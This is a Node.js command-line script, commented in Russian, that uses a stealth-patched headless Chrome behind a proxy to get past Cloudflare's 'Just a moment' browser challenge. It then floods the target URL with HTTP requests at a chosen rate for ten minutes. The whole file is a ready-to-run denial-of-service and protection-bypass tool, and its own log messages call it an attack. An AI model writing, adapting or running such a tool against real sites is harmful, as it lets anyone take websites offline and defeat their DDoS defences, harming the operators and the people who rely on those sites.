const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { Worker } = require('worker_threads');

// Глубокие настройки stealth
puppeteer.use(StealthPlugin());
puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')());

const CHROME_ARGS = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--lang=en-US,en',
    '--window-size=1920,1080'
];

async function attackTarget(targetUrl, proxy, rate) {
    console.log(`[⚙] Инициализация атаки на ${targetUrl}`);
    
    const browser = await puppeteer.launch({
        headless: 'new',
        args: [...CHROME_ARGS, `--proxy-server=${proxy}`],
        ignoreHTTPSErrors: true,
        executablePath: '/usr/bin/google-chrome'
    });

    try {
        const page = await browser.newPage();
        
        // Детальная настройка фингерпринта
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118"'
        });

        // Эмуляция человеческого поведения
        await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
        await page.evaluateOnNewDocument(() => {
            delete navigator.__proto__.webdriver;
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
        });

        console.log(`[🌐] Переход на целевой URL...`);
        await page.goto(targetUrl, {
            waitUntil: 'domcontentloaded',
            timeout: 60000
        });

        // Расширенная обработка Cloudflare
        await handleCloudflare(page);
        
        console.log(`[✅] Успешное подключение. Запуск флуда...`);
        startRequestsFlood(targetUrl, proxy, rate);

    } catch (error) {
        console.error(`[💥] Критическая ошибка: ${error.message}`);
        await browser.close();
    }
}

async function handleCloudflare(page) {
    try {
        const title = await page.title();
        if (!title.includes('Just a moment')) return;

        console.log('[🛡] Обнаружена защита Cloudflare');
        
        // Расширенная эмуляция человеческого поведения
        await page.mouse.move(100, 100);
        await page.waitForTimeout(1500);
        await page.mouse.move(200, 200);
        await page.waitForTimeout(1000);
        
        // Решение JavaScript Challenge
        await page.waitForFunction(() => {
            const el = document.querySelector('#challenge-form');
            return el && el.offsetParent !== null;
        }, { timeout: 15000 });
        
        await page.click('#challenge-form input[type="submit"]');
        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 20000 });
        
        console.log('[✅] Защита успешно пройдена');
    } catch (error) {
        console.error('[❌] Не удалось обойти защиту:', error.message);
        throw error;
    }
}

function startRequestsFlood(targetUrl, proxy, rate) {
    const [proxyHost, proxyPort] = proxy.split(':');
    let requestCount = 0;

    console.log(`[🔥] Запуск флуда с интенсивностью ${rate} запр/сек`);
    
    const interval = setInterval(async () => {
        try {
            await axios.get(targetUrl, {
                proxy: {
                    host: proxyHost,
                    port: parseInt(proxyPort)
                },
                timeout: 5000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
            });
            process.stdout.write('.');
            requestCount++;
        } catch (error) {
            process.stdout.write('x');
        }
    }, 1000 / rate);

    // Статистика каждые 10 секунд
    setInterval(() => {
        console.log(`\n[📊] Отправлено запросов: ${requestCount}`);
    }, 10000);

    // Автоматическое завершение через 10 минут
    setTimeout(() => {
        clearInterval(interval);
        console.log('\n[⏱] Атака завершена по таймауту');
        process.exit(0);
    }, 600000);
}

// Запуск
if (process.argv.length < 5) {
    console.log('Использование: node cf_bypass.js <URL> <proxy:port> <rate>');
    process.exit(1);
}

attackTarget(
    process.argv[2], 
    process.argv[3], 
    parseInt(process.argv[4])
).catch(console.error);
